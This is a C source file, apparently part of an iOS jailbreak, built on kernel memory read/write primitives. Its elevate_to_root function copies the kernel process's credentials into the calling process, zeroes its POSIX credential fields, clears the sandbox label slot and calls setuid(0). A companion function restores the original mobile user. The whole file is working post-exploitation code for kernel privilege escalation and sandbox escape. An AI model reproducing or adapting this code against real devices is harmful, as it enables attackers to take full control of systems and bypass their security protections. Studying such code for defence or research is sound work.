#include <mach/mach.h>

#include "common.h"
#include "kmem.h"
#include "kutils.h"

bool did_require_elevation = false;
uint8_t original_ucred_struct[12];

#ifdef __LP64__
#define LOG_KPTR(...) LOG("%s %llx", __VA_ARGS__)
#else
#define LOG_KPTR(...) LOG("%s %x", __VA_ARGS__)
#endif

#define mac_label_set(label, slot, v) kwrite_kptr(label + slot * sizeof(void*) + sizeof(int), v)

kern_return_t elevate_to_root()
{
    kptr_t kernproc = find_proc(0);
    LOG_KPTR("got kern proc at", kernproc);

    kptr_t ourproc = find_proc(getpid());
    LOG_KPTR("got ourproc at", ourproc);

    kptr_t kern_ucred = kread_kptr(kernproc + OFFSET_PROC_P_UCRED); // proc->p_ucred
    kptr_t our_ucred = kread_kptr(ourproc + OFFSET_PROC_P_UCRED); // proc->p_ucred

    kwrite_kptr(ourproc + OFFSET_PROC_P_UCRED, kern_ucred);

    // save ucred struct
    kread(our_ucred + OFFSET_UCRED_CR_POSIX, original_ucred_struct, 12); // ucred->cr_posix

    void* empty_buffer = calloc(12, 1);
    kwrite(our_ucred + OFFSET_UCRED_CR_POSIX, empty_buffer, 12);

    kptr_t label = kread_kptr(our_ucred + OFFSET_UCRED_CR_LABEL);

    // mac_label_set(label, OFFSET_AMFI_SLOT, 0x0);
    mac_label_set(label, OFFSET_SANDBOX_SLOT, 0x0);

    // if (getuid() != 0)
    // {

    setuid(0);

    did_require_elevation = true;
    // }

    kwrite_kptr(ourproc + OFFSET_PROC_P_UCRED, our_ucred);

    LOG("our uid is now %d", getuid());

    return getuid() == 0 ? KERN_SUCCESS : KERN_FAILURE;
}

kern_return_t restore_to_mobile()
{
    if (!did_require_elevation || getuid() == 501) {
        return KERN_SUCCESS;
    }

    kptr_t ourproc = find_proc(getpid());
    LOG_KPTR("got ourproc at", ourproc);

    kptr_t our_ucred = kread_kptr(ourproc + OFFSET_PROC_P_UCRED);

    kwrite(our_ucred + OFFSET_UCRED_CR_POSIX, original_ucred_struct, 12);

    setuid(501);

    LOG("our uid is now %d", getuid());

    return getuid() == 501 ? KERN_SUCCESS : KERN_FAILURE;
}
